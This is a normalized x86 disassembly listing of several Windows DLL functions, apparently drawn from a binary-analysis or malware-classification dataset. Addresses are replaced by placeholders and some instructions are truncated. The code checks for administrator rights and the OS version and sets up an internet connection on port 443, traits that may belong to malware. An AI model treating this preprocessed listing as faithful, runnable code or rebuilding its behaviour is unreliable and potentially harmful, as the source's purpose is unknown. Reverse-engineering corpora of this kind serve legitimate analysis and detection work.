mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
mov [ edi + 0x3c ] eax
inc [ eax ]
mov eax [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov esi edi
call sub_1002d4a0
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
lea eax [ ebp - 0xc ]
lea esi [ edi + 0x20 ]
mov [ ebp - 0xc ] ecx
cmp esi eax
je r-xdata
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test ecx ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ebx
inc [ ebx ]
mov esi [ esi ]
test esi esi
je r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi ecx
call sub_100324d0
mov eax [ edi + 0x24 ]
lea esi [ edi + 0x20 ]
test eax eax
je r-xdata
call sub_100324d0
mov ecx [ ebp - 0xc ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
sub_1000da80
push ebp
mov ebp esp
sub esp 0x764
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi edx
push edi
mov edi ecx
mov [ ebp - 0x748 ] esi
mov [ ebp - 0x744 ] ebx
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea edx [ ebp - 0x74c ]
mov eax 0x2
call sub_10021030
lea edx [ ebp - 0x73c ]
mov eax 0x6
call sub_10021030
lea edx [ ebp - 0x740 ]
mov eax 0x1
call sub_10021030
mov eax edx
push eax
push edi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x210 ]
test eax eax
mov edx 0x104
mov eax ecx
je r-xdata
mov esi edi
xor ebx ebx
sub esi ecx
lea ebx [ ebp - 0x73c ]
xor esi esi
sub ebx ecx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test esi esi
je r-xdata
sub eax 0x2
mov esi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov edi [ ebp - 0x748 ]
lea eax [ ebp - 0x740 ]
push eax
push edi
call [ StrStrW@IAT ]
xor ebx ebx
lea ecx [ ebp - 0x620 ]
test eax eax
mov edx 0x208
mov eax ecx
je r-xdata
lea eax [ edx + 0x6 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x104
lea ebx [ ebp - 0x210 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ edx + 0x3 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov esi edi
sub esi ecx
lea esi [ ebp - 0x73c ]
sub esi ecx
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x210 ]
call sub_10050c60
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x74c ]
push eax
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ edx + 0xb ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
push edi
mov esi 0x208
lea ebx [ ebp - 0x620 ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ edx + 0x8 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffdf6 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x740 ]
push ecx
lea ebx [ ebp - 0x620 ]
call sub_10050c60
test eax eax
je r-xdata
mov eax 0xc
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x73c ]
push eax
lea ebx [ ebp - 0x620 ]
call sub_10050c60
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
lea ebx [ ebp - 0x620 ]
call sub_10050c60
test eax eax
je r-xdata
mov eax 0xd
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x114
lea eax [ ebp - 0x738 ]
push 0x0
push eax
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x738 ]
push ecx
mov [ ebp - 0x738 ] 0x114
call [ GetVersionExW@IAT ]
cmp [ ebp - 0x734 ] 0x6
jae r-xdata
mov eax 0xe
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x210 ]
call sub_10055050
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call [ GetTickCount@IAT ]
push eax
call sub_10004833
add esp 0x4
call sub_10071d65
xor edx edx
mov ecx 0xa
div ecx
add edx 0x3
push edx
call sub_100601d0
lea esi [ ebp - 0x760 ]
mov ebx eax
mov [ ebp - 0x760 ] 0x0
call sub_10032e60
test eax eax
jne r-xdata
mov edx [ ebp - 0x744 ]
push edx
call sub_10070480
test eax eax
je r-xdata
lea edi [ ebp - 0x620 ]
lea ecx [ ebp - 0x210 ]
lea esi [ ebp - 0x760 ]
call sub_1001d1d0
test eax eax
je r-xdata
mov eax 0xf
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_10010fd0
test eax eax
je r-xdata
mov eax 0x10
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x760 ]
call sub_100673e0
test eax eax
je r-xdata
mov eax 0x11
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
call sub_1000a86e
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x12
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1000df50
push ebp
mov ebp esp
push 0xffffffff
push sub_10084e0c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x100
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor ebx ebx
push ebx
push ebx
push 0x2a
push ebx
mov [ ebp - 0x104 ] eax
mov [ ebp - 0xf0 ] ecx
mov [ ebp - 0x100 ] edx
call [ InternetSetOptionW@IAT ]
mov eax [ ebp + 0x14 ]
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push 0x10
call sub_10057a30
lea eax [ ebp - 0x3c ]
add esp 0x8
mov [ ebp - 0xd0 ] 0xf
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xe4 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push 0xa5
call sub_1002b2d3
mov esi [ ebp + 0x18 ]
mov edi eax
mov ecx 0x29
[ edi ] [ esi ]
push 0xdc
mov [ ebp - 0xec ] eax
movsb [ edi ] [ esi ]
call sub_1002b2d3
mov esi eax
mov eax [ ebp - 0xec ]
add esp 0x8
xor edi edi
mov [ ebp - 0xe8 ] eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ ebp - 0x3c ]
push edx
lea ecx [ ebp - 0xe4 ]
call sub_1003e780
push 0x4
mov [ ebp - 0x4 ] ebx
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xe8 ]
mov cx [ eax ]
mov [ esi ] cx
mov dl [ eax + 0x2 ]
mov [ esi + 0x2 ] dl
mov cl [ edi + rw-data ]
mov eax [ esi ]
push ebx
lea edx [ ebp - 0xf8 ]
and eax 0xffffff
mov [ ebp - 0xf4 ] cl
push edx
mov ecx rw-data
mov [ ebp - 0xf8 ] eax
call sub_10071840
push eax
lea eax [ ebp - 0x10c ]
push eax
mov ecx rw-data
call sub_100410b0
add [ ebp - 0xe8 ] 0x3
inc edi
add esi 0x4
cmp edi 0x37
jl r-xdata
xor esi esi
push ebx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov ecx eax
call sub_100590f0
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0xe4 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
call sub_100528a0
add esp 0x8
cmp [ ebp - 0x60 ] 0x8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
jae r-xdata
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x4 ] bl
cmp esi ebx
jne r-xdata
push ebx
push ebx
push 0x1bb
push ebx
push eax
mov ecx esi
call sub_100681e0
mov edi eax
mov [ ebp - 0xfc ] edi
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
mov eax r--data
jmp r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0xf0 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ ebp - 0x60 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_1003e780
lea eax [ ebp - 0x58 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_1003acf0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
xor ecx ecx
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x58 ]
push ecx
call sub_1000a86e
add esp 0x4
mov edx [ ebp - 0xe4 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_1003e780
lea edx [ ebp - 0x58 ]
push edx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_1003acf0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov esi [ ebp - 0x104 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push ebx
call sub_10057a30
mov eax esi
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x58 ]
push eax
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_1003e780
lea edx [ ebp - 0x58 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x90 ]
push ecx
mov [ ebp - 0x4 ] 0x5
call sub_100282d0
add esp 0xc
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_1000a86e
add esp 0x4
push ebx
push r--data
mov ecx rw-data
call sub_1003e780
lea ecx [ ebp - 0x90 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
mov [ ebp - 0x10c ] r--data
mov [ ebp - 0x108 ] ebx
call sub_100528a0
add esp 0x8
mov esi 0x8
mov [ ebp - 0x4 ] 0x9
cmp [ eax + 0x14 ] esi
jb r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x6
call sub_10057a30
push rw-data
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
call sub_10003080
add esp 0x14
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x8
call sub_10004e10
cmp [ ebp - 0x98 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
push 0xa00000
push r--data
lea ecx [ ebp - 0x10c ]
push ecx
push 0x1
push ebx
push eax
push 0x1
mov ecx edi
call sub_100697b0
push eax
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_10007bd0
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov eax [ eax ]
mov eax [ ebp - 0xac ]
push eax
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0xf8 ]
xor eax eax
mov edi 0x7
mov [ ebp - 0x98 ] edi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] ax
cmp esi ebx
je r-xdata
mov edx [ ebp - 0xac ]
push edx
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
push ebx
push ebx
mov ecx esi
call sub_10039070
test eax eax
je r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0xec ]
push ecx
lea edx [ ebp - 0xf0 ]
push edx
mov ecx esi
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xec ] ebx
call sub_1000a030
cmp [ ebp - 0xec ] ebx
je r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_1003d2b0
lea ecx [ ebp - 0x1c ]
push ecx
push 0x3
mov edi eax
call sub_10057a30
sub esp 0x10
mov esi esp
lea eax [ ebp - 0x1c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x100 ] esp
mov [ esi ] bl
lea ecx [ eax + 0x1 ]
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_1000a86e
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
push eax
lea edx [ ebp - 0x1c ]
push edx
mov ecx esi
call sub_1003e780
mov eax [ edi + 0x4 ]
push 0x26
push eax
call sub_10072c30
mov ecx [ edi + 0x4 ]
push ecx
call sub_100729d0
mov esi [ ebp - 0xf4 ]
add esp 0x28
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax r--data
jmp r-xdata
xor edx edx
cmp [ ebp - 0xd0 ] esi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] dx
jmp r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
cmp [ ebp - 0x7c ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
jb r-xdata
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_1000a86e
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_1000a86e
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax r--data
jmp r-xdata
push edi
push r--data
call sub_1006d560
add esp 0x8
push ebx
push r--data
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
call sub_1003e780
mov esi [ rw-data ]
mov [ ebp - 0x4 ] 0xc
cmp esi [ rw-data ]
je r-xdata
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov esi [ ebp - 0xb8 ]
inc esi
push esi
call sub_10021090
push esi
mov edi eax
push ebx
push edi
call sub_1007f8f0
mov eax [ ebp - 0xc8 ]
mov esi 0x10
add esp 0x10
cmp [ ebp - 0xb4 ] esi
jae r-xdata
lea edx [ ebp - 0xf0 ]
push edx
push 0x13
mov edi 0x10
call sub_10057a30
lea eax [ ebp - 0xf0 ]
add esp 0x8
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0xb8 ]
push ecx
push eax
push edi
call sub_1007f580
add esp 0xc
cmp [ ebp - 0xb4 ] esi
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
lea eax [ ebp - 0xf0 ]
push eax
mov ecx esi
call sub_100198e0
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ esi + 0x10 ]
lea edx [ ecx - 0x1 ]
cmp eax edx
jne r-xdata
mov eax [ esi + 0x10 ]
dec eax
push eax
push 0x1
lea ecx [ ebp - 0x90 ]
push ecx
mov ecx esi
call sub_10028bd0
lea edx [ ebp - 0xec ]
push edx
push 0x2
mov [ ebp - 0x4 ] 0xd
call sub_10057a30
lea eax [ ebp - 0xec ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edi [ eax + 0x1 ]
xor ecx ecx
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ ebp - 0xe8 ]
push eax
push 0x1
call sub_10057a30
lea eax [ ebp - 0xe8 ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
dec ecx
push ecx
push ebx
lea eax [ ebp - 0xac ]
push eax
mov ecx esi
call sub_10028bd0
push 0xffffffff
push ebx
lea ecx [ ebp - 0xac ]
push ecx
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x10
call sub_10004e10
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
lea eax [ ebp - 0xec ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_1003e780
lea ecx [ ebp - 0x58 ]
push ecx
lea edx [ ebp - 0x90 ]
push edx
lea eax [ ebp - 0xac ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_10032140
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0xf
call sub_10004e10
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
mov eax edi
mov edx [ ebp - 0xe4 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0xe8 ]
push ecx
lea ecx [ ebp - 0x58 ]
call sub_1003e780
mov [ ebp - 0x4 ] 0x11
cmp [ esi + 0x14 ] edi
jb r-xdata
add esi 0x1c
cmp esi [ rw-data ]
jne r-xdata
mov edx [ ebp - 0xac ]
jmp r-xdata
mov edi 0x10
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edx
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x7c ] edi
jb r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x58 ]
push edx
push eax
lea eax [ ebp - 0xac ]
push eax
call sub_100282d0
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x12
call sub_10004e10
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
jmp r-xdata
mov edx [ ebp - 0x58 ]
call sub_1000a86e
add esp 0x4
sub_1000e9f0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002d290
mov eax [ fs : 0x0 ]
push eax
sub esp 0xabc
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
mov [ ebp - 0xac4 ] edi
xor ebx ebx
mov [ ebp - 0xab0 ] ebx
mov [ ebp - 0xaac ] ebx
mov [ ebp - 0xabc ] ebx
mov [ ebp - 0xacc ] ebx
mov [ ebp - 0xab8 ] ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp edi ebx
je r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
lea edx [ ebp - 0xab4 ]
lea eax [ ebx + 0x1 ]
call sub_1006e040
lea edx [ ebp - 0xaa8 ]
lea eax [ ebx + 0x4 ]
call sub_1006e040
lea edx [ ebp - 0xaa4 ]
xor eax eax
call sub_1006e040
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
mov edx 0x30c
lea ecx [ ebp - 0x690 ]
test eax eax
mov eax ecx
je r-xdata
sub esi ecx
xor edi edi
lea ebx [ ebp - 0xaa8 ]
sub ebx ecx
jmp r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
lea eax [ ebp - 0xaa4 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10050c60
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ ebp - 0xaa4 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10050c60
test eax eax
jne r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x690 ]
call sub_10050c60
test eax eax
jne r-xdata
lea edx [ ebp - 0xaa8 ]
push edx
call sub_10050c60
test eax eax
jne r-xdata
lea eax [ ebp - 0xaa8 ]
push eax
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0xaa4 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
